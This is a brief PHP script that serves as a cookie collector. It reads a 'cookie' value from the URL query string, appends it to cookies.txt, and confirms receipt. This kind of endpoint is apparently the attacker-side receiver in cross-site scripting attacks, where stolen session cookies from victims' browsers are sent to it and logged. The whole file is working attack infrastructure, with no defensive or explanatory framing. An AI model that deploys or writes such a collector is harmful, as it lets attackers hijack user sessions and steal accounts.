<?php
if(isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];  // Capture the cookie parameter from the URL
    file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);  // Log it to a file
    echo "Cookie received.";
} else {
    echo "No cookie received.";
}
?>
